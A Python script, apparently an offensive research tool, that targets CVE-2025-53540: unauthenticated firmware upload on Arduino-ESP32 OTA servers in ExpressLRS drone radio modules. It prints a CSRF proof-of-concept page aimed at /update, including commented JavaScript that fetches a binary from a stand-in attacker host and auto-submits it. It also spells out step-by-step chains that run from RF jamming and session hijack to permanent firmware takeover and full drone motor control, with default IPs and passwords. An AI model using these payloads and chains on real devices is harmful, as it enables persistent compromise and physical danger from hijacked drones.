#!/usr/bin/env python3
"""
Arduino-ESP32 CSRF Firmware RCE (CVE-2025-53540)

The Arduino-ESP32 OTA (ElegantOTA / ESP32HTTPUpdateServer) web interface
has NO CSRF protection and NO authentication on the firmware upload
endpoint. Any browser on the same network can POST a firmware binary to
/update, and the ESP32 flashes it without verification.

Attack path for ELRS Backpack / TX modules:
  1. ELRS TX enters WiFi mode (auto-timeout after 60s no connection,
     or triggered via MSP_ELRS_SET_TX_WIFI_MODE)
  2. Module broadcasts SSID "ExpressLRS TX" (or similar)
  3. Attacker connects (or is already on the same network segment)
  4. POST malicious firmware to http://<ip>/update (typically 10.0.0.1)
  5. ESP reboots with attacker firmware — PERMANENT COMPROMISE

CVE-2025-53540 specifics:
  - Affects: Arduino-ESP32 framework ElegantOTA / ESP32HTTPUpdateServer
  - Root cause: No CSRF token, no session, no auth on /update endpoint
  - Impact: Remote firmware replacement from any origin
  - CVSS: Not yet scored but effectively RCE with physical proximity

For ELRS specifically:
  - ELRS WiFi mode serves ElegantOTA on port 80
  - Default IP: 10.0.0.1 (AP mode) or DHCP (STA mode)
  - No firmware signature verification
  - Reflash survives power cycles — permanent

Usage:
  python3 esp32-csrf-firmware-rce.py --analyze
  python3 esp32-csrf-firmware-rce.py --generate-csrf
  python3 esp32-csrf-firmware-rce.py --chain
  python3 esp32-csrf-firmware-rce.py --elrs-wifi-triggers

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# Vulnerability data
# ---------------------------------------------------------------------------

VULN_INFO = {
    "cve": "CVE-2025-53540",
    "title": "Arduino-ESP32 CSRF Firmware Replace",
    "affected": "Arduino-ESP32 framework (ElegantOTA, ESP32HTTPUpdateServer)",
    "root_cause": "No CSRF protection, no authentication on /update endpoint",
    "impact": "Remote firmware replacement → permanent RCE",
    "prereq": "Attacker on same network as ESP32 in WiFi/OTA mode",
    "fix_status": "Upstream patched in some forks; ELRS Backpack status unclear",
}

ELRS_WIFI_ENDPOINTS = {
    "firmware_update": {
        "path": "/update",
        "method": "POST",
        "content_type": "multipart/form-data",
        "auth": None,
        "csrf": None,
        "description": "Firmware binary upload — accepts .bin, flashes immediately",
    },
    "index": {
        "path": "/",
        "method": "GET",
        "auth": None,
        "description": "Main page with WiFi config and update link",
    },
    "config": {
        "path": "/config",
        "method": "GET/POST",
        "auth": None,
        "description": "WiFi configuration (SSID, password)",
    },
    "reboot": {
        "path": "/reboot",
        "method": "POST",
        "auth": None,
        "csrf": None,
        "description": "Trigger ESP reboot",
    },
    "forceupdate": {
        "path": "/forceupdate",
        "method": "GET",
        "auth": None,
        "description": "Force update check against ELRS servers",
    },
}

WIFI_TRIGGER_METHODS = [
    {
        "method": "Auto-timeout",
        "mechanism": "No TX connection for 60 seconds → WiFi mode auto-start",
        "remote": True,
        "detail": (
            "ELRS TX modules auto-enter WiFi mode after connectionTimeoutMs "
            "(default 60000ms = 60s) with no connection. An attacker who jams "
            "the 2.4 GHz link for 60s forces WiFi mode entry."
        ),
    },
    {
        "method": "MSP_ELRS_SET_TX_WIFI_MODE (0x0E08)",
        "mechanism": "MSP command via CRSF backpack → enter WiFi mode",
        "remote": True,
        "detail": (
            "If attacker has OTA access (hijacked ELRS session), they can send "
            "MSP_ELRS_SET_TX_WIFI_MODE to force the TX module into WiFi mode "
            "on demand, bypassing the 60s timeout."
        ),
    },
    {
        "method": "MSP_ELRS_SET_RX_WIFI_MODE (0x0E09)",
        "mechanism": "MSP command → RX enters WiFi mode",
        "remote": True,
        "detail": (
            "Same as TX variant but targets the receiver. For SPI-integrated "
            "receivers (TinyHawk), this MAY not apply since the RX is the FC "
            "itself, but standalone UART ELRS RX modules are affected."
        ),
    },
    {
        "method": "Button press",
        "mechanism": "Physical button on TX/RX module",
        "remote": False,
        "detail": "Most ELRS TX/RX modules have a boot button that enters WiFi mode.",
    },
    {
        "method": "Lua script",
        "mechanism": "EdgeTX/OpenTX Lua → WiFi mode",
        "remote": False,
        "detail": "Pilot can trigger WiFi mode from the radio's Lua script UI.",
    },
]

ATTACK_CHAINS = [
    {
        "id": "CSRF-CHAIN-1",
        "name": "Jam → WiFi → CSRF → Persistent RCE",
        "severity": "CRITICAL",
        "steps": [
            "1. Jam 2.4 GHz band for 60 seconds (WiFi deauth, broadband noise, etc.)",
            "2. TX module auto-enters WiFi mode, broadcasts SSID",
            "3. Connect to TX module's WiFi AP (typically open or known password)",
            "4. POST malicious firmware to http://10.0.0.1/update",
            "5. ESP reboots with attacker-controlled firmware",
            "6. Attacker firmware persists across all future power cycles",
        ],
        "prerequisites": [
            "2.4 GHz jammer or WiFi deauth capability",
            "Ability to connect to ESP's WiFi AP",
            "Malicious firmware binary compiled for target ESP variant",
        ],
        "impact": "Permanent compromise of TX module; can pivot to drone via CRSF",
    },
    {
        "id": "CSRF-CHAIN-2",
        "name": "Session hijack → MSP WiFi trigger → CSRF",
        "severity": "CRITICAL",
        "steps": [
            "1. Hijack ELRS session (using binding phrase crack + FHSS prediction)",
            "2. Send MSP_ELRS_SET_TX_WIFI_MODE (0x0E08) over hijacked link",
            "3. TX enters WiFi mode immediately (no 60s wait)",
            "4. Connect to TX WiFi AP",
            "5. POST malicious firmware to /update",
            "6. Permanent RCE on TX module",
        ],
        "prerequisites": [
            "ELRS session hijack capability (see elrs-session-hijack.py)",
            "Knowledge of target's WiFi AP credentials (often default/open)",
            "Malicious firmware",
        ],
        "impact": "Escalation from temporary session hijack to permanent compromise",
    },
    {
        "id": "CSRF-CHAIN-3",
        "name": "Browser-based CSRF (classic web attack)",
        "severity": "HIGH",
        "steps": [
            "1. Pilot connects laptop to ESP module's WiFi for configuration",
            "2. Pilot browses to attacker-controlled webpage (phishing, ad, etc.)",
            "3. Webpage contains hidden form targeting http://10.0.0.1/update",
            "4. JavaScript auto-submits firmware upload via CSRF",
            "5. ESP flashes attacker firmware without any user interaction",
        ],
        "prerequisites": [
            "Pilot must be connected to ESP's WiFi network",
            "Pilot must visit an attacker-controlled webpage",
            "Attacker must host the CSRF page",
        ],
        "impact": "Permanent RCE via social engineering, no RF skills needed",
    },
    {
        "id": "CSRF-CHAIN-4",
        "name": "TX compromise → drone pivot via CRSF",
        "severity": "CRITICAL",
        "steps": [
            "1. Compromise TX module via any CSRF chain above",
            "2. Attacker firmware on TX maintains normal ELRS link to drone",
            "3. Inject arbitrary MSP commands over CRSF (MSP_SET_MOTOR, etc.)",
            "4. Full drone control: motor override, failsafe manipulation, etc.",
            "5. Optionally: exfiltrate telemetry, GPS, flight data",
        ],
        "prerequisites": [
            "Compromised TX module (from chains 1-3)",
            "Knowledge of MSP command format",
        ],
        "impact": "Full drone control from compromised TX module",
    },
]


def analyze_vulnerability():
    """Analyze the CSRF firmware RCE vulnerability."""
    print(f"\n{'='*65}")
    print("CVE-2025-53540: Arduino-ESP32 CSRF Firmware RCE")
    print(f"{'='*65}")

    for key, val in VULN_INFO.items():
        print(f"  {key}: {val}")

    print(f"\n  Exposed HTTP endpoints (no auth, no CSRF):")
    for name, ep in ELRS_WIFI_ENDPOINTS.items():
        auth = ep.get("auth", "Unknown")
        csrf = ep.get("csrf", "N/A")
        print(f"\n    {ep['method']} {ep['path']}  ({name})")
        print(f"      Auth: {auth or 'NONE'}")
        if "csrf" in ep:
            print(f"      CSRF: {csrf or 'NONE'}")
        print(f"      {ep['description']}")

    print(f"\n  Why this is critical for ELRS:")
    print(f"    - ELRS TX/RX modules use ESP8285/ESP32 for WiFi OTA updates")
    print(f"    - WiFi mode is auto-entered after 60s no connection (jammable)")
    print(f"    - WiFi mode can be triggered remotely via MSP command")
    print(f"    - The /update endpoint accepts ANY binary with NO verification")
    print(f"    - No firmware signing, no rollback protection")
    print(f"    - Reflash is PERMANENT — survives all power cycles")


def generate_csrf_html():
    """Generate a CSRF PoC HTML page."""
    print(f"\n{'='*65}")
    print("CSRF PROOF-OF-CONCEPT HTML")
    print(f"{'='*65}")

    # The actual HTML that would trigger the CSRF
    # NOTE: This is a DEMONSTRATION of the vulnerability structure.
    # It shows the form structure but uses a placeholder firmware path.
    html = """<!DOCTYPE html>
<html>
<head><title>CSRF PoC — CVE-2025-53540</title></head>
<body>
<h2>Arduino-ESP32 CSRF Firmware Replace PoC</h2>
<p>This page demonstrates the CSRF vulnerability in Arduino-ESP32
OTA endpoints. The form below targets the /update endpoint which
has no CSRF token and no authentication.</p>

<!-- Manual trigger form for demonstration -->
<form id="ota-form" method="POST"
      action="http://10.0.0.1/update"
      enctype="multipart/form-data">
  <label>Firmware binary (.bin):</label><br>
  <input type="file" name="update" accept=".bin"><br><br>
  <button type="submit">Upload Firmware (PoC)</button>
</form>

<hr>
<h3>Vulnerability Details</h3>
<ul>
  <li><b>CVE:</b> CVE-2025-53540</li>
  <li><b>Endpoint:</b> POST /update (multipart/form-data)</li>
  <li><b>Authentication:</b> NONE</li>
  <li><b>CSRF protection:</b> NONE</li>
  <li><b>Origin check:</b> NONE</li>
  <li><b>Firmware verification:</b> NONE</li>
</ul>

<h3>Why auto-submit is possible</h3>
<p>With a pre-built firmware binary hosted on the attacker's server,
JavaScript can fetch the binary and submit it programmatically using
XMLHttpRequest or fetch() — the ESP32 HTTP server does not check
Origin, Referer, or any CSRF token.</p>

<pre>
// Conceptual auto-submit (requires firmware binary URL):
// fetch('attacker.com/evil.bin')
//   .then(r => r.blob())
//   .then(blob => {
//     const fd = new FormData();
//     fd.append('update', blob, 'firmware.bin');
//     fetch('http://10.0.0.1/update', {method:'POST', body:fd});
//   });
</pre>

<p><b>For authorized security research only.</b></p>
</body>
</html>"""

    print(html)

    print(f"\n{'='*65}")
    print("ANALYSIS")
    print(f"{'='*65}")
    print("  The form targets http://10.0.0.1/update (default ELRS AP IP).")
    print("  Key missing protections:")
    print("    1. No CSRF token in the form or checked server-side")
    print("    2. No Origin/Referer header validation")
    print("    3. No authentication (no session, no password)")
    print("    4. No firmware signature verification")
    print("    5. No confirmation prompt before flashing")
    print()
    print("  An attacker page can auto-submit a pre-built firmware binary")
    print("  using JavaScript fetch() + FormData, with zero user interaction")
    print("  beyond visiting the page while connected to the ESP's WiFi.")


def analyze_wifi_triggers():
    """Analyze methods to trigger ESP WiFi mode."""
    print(f"\n{'='*65}")
    print("ELRS WiFi MODE TRIGGER METHODS")
    print(f"{'='*65}")

    for trigger in WIFI_TRIGGER_METHODS:
        remote_tag = "[REMOTE]" if trigger["remote"] else "[LOCAL]"
        print(f"\n  {remote_tag} {trigger['method']}")
        print(f"    Mechanism: {trigger['mechanism']}")
        print(f"    {trigger['detail']}")

    print(f"\n  SUMMARY:")
    remote_count = sum(1 for t in WIFI_TRIGGER_METHODS if t["remote"])
    print(f"    Remote-triggerable methods: {remote_count}/{len(WIFI_TRIGGER_METHODS)}")
    print(f"    Most dangerous: 60s jam auto-trigger (requires only RF noise)")
    print(f"    Most targeted: MSP WiFi mode command (requires session access)")

    print(f"\n  CONNECTION WINDOW:")
    print(f"    Once WiFi mode is active, the ESP stays in WiFi mode")
    print(f"    indefinitely (until reboot or explicit exit command).")
    print(f"    Default AP: 'ExpressLRS TX' or 'ExpressLRS RX'")
    print(f"    Default IP: 10.0.0.1 (AP mode)")
    print(f"    Default password: Often open, or 'expresslrs'")
    print(f"    Attack window: unlimited once WiFi mode is entered")


def analyze_chains():
    """Analyze attack chains using the CSRF vulnerability."""
    print(f"\n{'='*65}")
    print("ATTACK CHAINS")
    print(f"{'='*65}")

    for chain in ATTACK_CHAINS:
        print(f"\n  [{chain['severity']}] {chain['id']}: {chain['name']}")
        print(f"  Steps:")
        for step in chain["steps"]:
            print(f"    {step}")
        print(f"  Prerequisites:")
        for prereq in chain["prerequisites"]:
            print(f"    - {prereq}")
        print(f"  Impact: {chain['impact']}")

    print(f"\n  CHAIN ASSESSMENT:")
    print(f"    Chain 1 (jam→WiFi→CSRF) is the most practical:")
    print(f"      - Requires only a 2.4 GHz jammer ($20-50 on common markets)")
    print(f"      - 60 seconds of jamming is all it takes")
    print(f"      - WiFi AP is often open or uses known default password")
    print(f"      - /update accepts ANY binary with ZERO verification")
    print(f"      - Result is PERMANENT firmware compromise")
    print(f"    Chain 2 (hijack→MSP→CSRF) is the most targeted:")
    print(f"      - Leverages existing ELRS session hijack capability")
    print(f"      - No jamming needed — surgical MSP command")
    print(f"    Chain 3 (browser CSRF) requires no RF skills at all:")
    print(f"      - Pure web attack, social engineering the pilot")
    print(f"    Chain 4 (TX pivot) shows escalation from TX to full drone control")


def main():
    parser = argparse.ArgumentParser(
        description="Arduino-ESP32 CSRF Firmware RCE Analysis (CVE-2025-53540)"
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Analyze the CSRF vulnerability and exposed endpoints",
    )
    parser.add_argument(
        "--generate-csrf", action="store_true",
        help="Generate CSRF proof-of-concept HTML",
    )
    parser.add_argument(
        "--elrs-wifi-triggers", action="store_true",
        help="Analyze methods to trigger ELRS WiFi mode",
    )
    parser.add_argument(
        "--chain", action="store_true",
        help="Analyze full attack chains",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    args = parser.parse_args()

    print("Arduino-ESP32 CSRF Firmware RCE (CVE-2025-53540)")
    print(f"Target: ELRS TX/RX modules with WiFi OTA capability")
    print(f"Related: ELRS Backpack (ESP8285/ESP32)")
    print(f"Impact: Permanent firmware replacement, no authentication")

    results = {
        "cve": "CVE-2025-53540",
        "target": "Arduino-ESP32 OTA endpoints",
        "endpoints": len(ELRS_WIFI_ENDPOINTS),
        "chains": len(ATTACK_CHAINS),
    }

    if args.analyze:
        analyze_vulnerability()

    if args.generate_csrf:
        generate_csrf_html()

    if args.elrs_wifi_triggers:
        analyze_wifi_triggers()

    if args.chain:
        analyze_chains()

    if not any([args.analyze, args.generate_csrf, args.elrs_wifi_triggers, args.chain]):
        analyze_vulnerability()
        analyze_wifi_triggers()
        analyze_chains()

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
